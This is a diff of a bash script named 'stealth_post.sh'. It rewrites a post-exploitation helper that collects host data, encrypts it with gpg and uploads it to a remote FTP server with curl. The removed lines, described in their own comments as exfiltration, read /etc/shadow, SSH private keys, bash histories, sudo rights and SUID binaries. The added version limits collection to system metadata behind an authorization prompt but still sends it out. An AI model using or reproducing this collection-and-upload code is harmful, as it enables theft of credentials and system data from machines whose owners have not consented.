@@ -1,24 +1,67 @@
 #!/bin/bash
+# stealth_post.sh - encrypted FTPS transfer helper for authorized assessments.
 set -euo pipefail
 
-# Usage :
-#   export FTP_USER="utilisateur"
-#   export FTP_PASS="motdepasse"
-#   export FTP_HOST="exemple.com"
-#   export FTP_PATH="uploads/sysinfo.txt.gpg"
-#   export GPG_PASSPHRASE="phrase_secrete"
-#   bash stealth_post.sh
-
-# Read FTP credentials from environment or optional config file
 FTP_USER="${FTP_USER:-}"
 FTP_PASS="${FTP_PASS:-}"
 FTP_HOST="${FTP_HOST:-}"
 FTP_PATH="${FTP_PATH:-}"
 GPG_PASSPHRASE="${GPG_PASSPHRASE:-}"
-# Optional configuration file (~/.stealth_post.conf)
 CONFIG_FILE="${FTP_CONFIG_FILE:-$HOME/.stealth_post.conf}"
+DRY_RUN=false
+ASSUME_AUTHORIZED="${SCRIPTING_ASSUME_AUTHORIZED:-false}"
 
-# Source config file if variables are empty and file exists
+usage() {
+    cat <<'EOF' >&2
+Usage: stealth_post.sh [options]
+  --dry-run                Validate configuration and print planned transfer
+  --yes-i-am-authorized    Confirm explicit authorization
+  --help                   Show this help
+
+Required environment variables or ~/.stealth_post.conf values:
+  FTP_USER, FTP_PASS, FTP_HOST, FTP_PATH, GPG_PASSPHRASE
+EOF
+    exit 1
+}
+
+require_authorization() {
+    if [[ "$ASSUME_AUTHORIZED" == true ]]; then
+        return 0
+    fi
+
+    if [[ ! -t 0 ]]; then
+        echo "Authorization confirmation required. Re-run with --yes-i-am-authorized only for approved assessments." >&2
+        exit 1
+    fi
+
+    read -rp "Type AUTHORIZED to confirm this encrypted transfer is approved: " confirmation
+    if [[ "$confirmation" != "AUTHORIZED" ]]; then
+        echo "Aborted." >&2
+        exit 1
+    fi
+}
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --dry-run)
+            DRY_RUN=true
+            shift
+            ;;
+        --yes-i-am-authorized)
+            ASSUME_AUTHORIZED=true
+            shift
+            ;;
+        --help|-h)
+            usage
+            ;;
+        *)
+            usage
+            ;;
+    esac
+done
+
+require_authorization
+
 if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z "$GPG_PASSPHRASE" ]]; then
     if [[ -f "$CONFIG_FILE" ]]; then
         # shellcheck disable=SC1090
@@ -31,62 +74,46 @@ if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z
     fi
 fi
 
-# Error if credentials still unset
 if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z "$GPG_PASSPHRASE" ]]; then
-    echo "❌ Variables FTP_USER, FTP_PASS, FTP_HOST, FTP_PATH ou GPG_PASSPHRASE non définies" >&2
+    echo "FTP_USER, FTP_PASS, FTP_HOST, FTP_PATH, and GPG_PASSPHRASE are required." >&2
     exit 1
 fi
 
-# Minimal post‑exploitation collection script. It gathers basic system
-# information and sends it to a remote FTP server for analysis. This
-# exfiltration mechanism must only be used in authorized contexts such as
-# sanctioned penetration tests. Using it without permission is prohibited.
+if [[ "$DRY_RUN" == true ]]; then
+    echo "DRY RUN: collect limited system metadata, encrypt it, and upload to ftps://$FTP_HOST/$FTP_PATH"
+    exit 0
+fi
+
+for cmd in gpg curl shred; do
+    if ! command -v "$cmd" >/dev/null 2>&1; then
+        echo "Missing required tool: $cmd" >&2
+        exit 1
+    fi
+done
 
 OUT="$(mktemp)"
-trap 'rm -f "$OUT"' EXIT
-> "$OUT"
-
-# Collecte minimale
-echo "[*] $(date '+%Y-%m-%d %H:%M:%S')" >> "$OUT"
-id >> "$OUT"
-hostname >> "$OUT"
-ip a | grep inet | grep -v '127.0.0.1' | awk '{print $2}' | head -n1 >> "$OUT"
-
-# Si root, capture quelques lignes du fichier shadow
-[ "$(id -u)" -eq 0 ] && head -n 5 /etc/shadow >> "$OUT" 2>/dev/null
-
-# Clés SSH & historique bash (extraits légers)
-find /home -name id_rsa -exec head -n 5 {} \; 2>/dev/null >> "$OUT"
-find /home -name .bash_history -exec head -n 5 {} \; 2>/dev/null >> "$OUT"
-
-# Commandes sudo autorisées
-sudo -l 2>/dev/null | grep -v "may not" >> "$OUT"
-
-# Binaries SUID
-find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null | grep -E 'bash|python|perl|find|nmap' >> "$OUT"
-
-# Chiffrement du fichier temporaire
-if ! command -v gpg >/dev/null 2>&1; then
-    echo "❌ gpg n'est pas installé" >&2
-    exit 1
-fi
-
 ENC_OUT="$OUT.gpg"
+trap 'rm -f "$OUT" "$ENC_OUT"' EXIT
+
+{
+    echo "[*] $(date '+%Y-%m-%d %H:%M:%S')"
+    id
+    hostname
+    ip -o addr show scope global 2>/dev/null | awk '{print $2, $4}'
+    uname -a
+    df -h
+} > "$OUT"
+
 if ! gpg --batch --yes --passphrase "$GPG_PASSPHRASE" -c "$OUT"; then
-    echo "❌ Échec du chiffrement avec gpg" >&2
+    echo "gpg encryption failed." >&2
     exit 1
 fi
 
-# Exfiltration via FTPS
-if ! command -v curl >/dev/null 2>&1; then
-    echo "❌ curl n'est pas installé" >&2
+if ! curl --ftp-ssl --ssl-reqd -sS -T "$ENC_OUT" --user "$FTP_USER:$FTP_PASS" "ftp://$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null; then
+    echo "FTPS upload failed." >&2
     exit 1
 fi
 
-if ! curl --ftp-ssl --ssl-reqd -s -T "$ENC_OUT" --user "$FTP_USER:$FTP_PASS" "ftp://$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null; then
-    echo "❌ Échec de l'exfiltration via curl (FTPS)" >&2
-    exit 1
-fi
-
-# Nettoyage
 shred -u "$OUT" "$ENC_OUT"
+trap - EXIT
+echo "Encrypted metadata uploaded to ftps://$FTP_HOST/$FTP_PATH"
